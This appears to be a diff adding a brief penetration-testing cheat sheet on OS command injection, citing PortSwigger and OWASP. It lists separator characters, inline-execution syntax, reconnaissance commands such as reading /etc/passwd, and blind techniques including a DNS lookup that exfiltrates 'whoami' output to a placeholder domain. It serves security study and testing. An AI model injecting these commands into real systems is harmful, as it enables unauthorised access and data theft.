@@ -1,0 +1,41 @@
+
+
+
+
+==============Command injection:
+Resources:  https://portswigger.net/web-security/os-command-injection
+            https://www.owasp.org/index.php/Command_Injection
+            https://www.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013)
+
+
+characters for command separation:
+    &
+    &&
+    |
+    ||
+
+only on Unix-based systems:
+
+    ;
+    Newline (0x0a or \n)
+
+On Unix-based systems, also use the following to perform inline execution of an injected command within the original command:
+
+    ` injected command `
+    $( injected command )
+
+--> Useful Commands (not blind OR using > to output in a readable file):
+
+Win & unix:   whoami
+Lin           cat /etc/passwd
+Win           type C:\boot.ini
+Lin           ifconfig
+Win           ipconfig
+Lin           uname -a
+Win           ver
+
+--> Useful commands when blind:
+ping -c 10 myip   and monitor inteface
+ping -c 10 127.0.0.1    and wait for delay
+nslookup mydomain.com      and monitor the request (may use a subdomain to differentiate between requests)
+nslookup `whoami`.mydomain.com      to exfiltrate command output
